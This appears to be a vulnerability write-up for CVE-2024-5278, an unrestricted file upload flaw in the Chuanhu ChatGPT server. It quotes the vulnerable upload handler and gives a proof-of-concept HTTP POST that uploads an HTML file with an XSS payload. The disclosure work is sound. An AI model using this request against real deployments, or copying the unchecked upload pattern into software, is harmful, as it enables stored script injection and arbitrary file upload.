# CVE-2024-5278 - File Upload Vulnerability in (chuanhuchatgpt)

![2](https://github.com/mohamedabdelhady933/MY-CVEs-Analyzing/assets/73122852/29c8266b-b62f-4f64-a643-e6d8a4f29333)

## Introduction

**CVE** : CVE-2024-5278
**Description** : File Upload Vulnerability on python server leads to medium-impact.
**Version** : 20240310
**Product** : Chuanhu Chatgpt

---

## Identifying the code vulnerability (Static Analysis)

The chuanhuchatgpt product has File Upload Vulnerability at /upload endpoint while uploading a new file that make a POST request.

```
def handle_file_upload(self, files, chatbot, language):
        """if the model accepts multi modal input, implement this function"""
        status = gr.Markdown.update()
        image_files = []
        other_files = []
        if files:
            for f in files:
                if f.name.endswith(IMAGE_FORMATS):
                    image_files.append(f)
                else:
                    other_files.append(f)
            if image_files:
                if self.multimodal:
                    chatbot.extend([(((image.name, None)), None) for image in image_files])
                    self.history.extend([construct_image(image.name) for image in image_files])
                else:
                    gr.Warning(i18n("该模型不支持多模态输入"))
            if other_files:
                try:
                    construct_index(self.api_key, file_src=files)
                    status = i18n("索引构建完成")
                except Exception as e:
                    import traceback
                    traceback.print_exc()
                    status = i18n("索引构建失败！") + str(e)
        if other_files:
            other_files = [f.name for f in other_files]
        else:
            other_files = None
        return gr.File.update(value=other_files), chatbot, status
```


The handle_file_upload function takes 3 arguments, Then check if the file's name ends with it's image format if so it will append. Then at the end update and store the file

At this point the function don't sanitize the file or content type or file extension . So i was able to upload html file with XSS payload also i was able to upload python file. and any extension




## POC

upload any file and change the name and extension then it will be uploaded

```
POST /upload HTTP/1.1
Host: 127.0.0.1:7860
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1:7860/
Content-Type: multipart/form-data; boundary=---------------------------330262580617276905211507475889
Origin: http://127.0.0.1:7860
Content-Length: 270
Connection: close
Cookie: _ga=GA1.1.898989309.1712525195; _gid=GA1.1.684123961.1712525195; _ga_R1FN4KJKJH=GS1.1.1712528655.2.1.1712528675.0.0.0
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

-----------------------------330262580617276905211507475889
Content-Disposition: form-data; name="files"; filename="test.html"
Content-Type: text/html

<h1>test</h1><img src=x onerror=alert(1)>
-----------------------------330262580617276905211507475889--
```

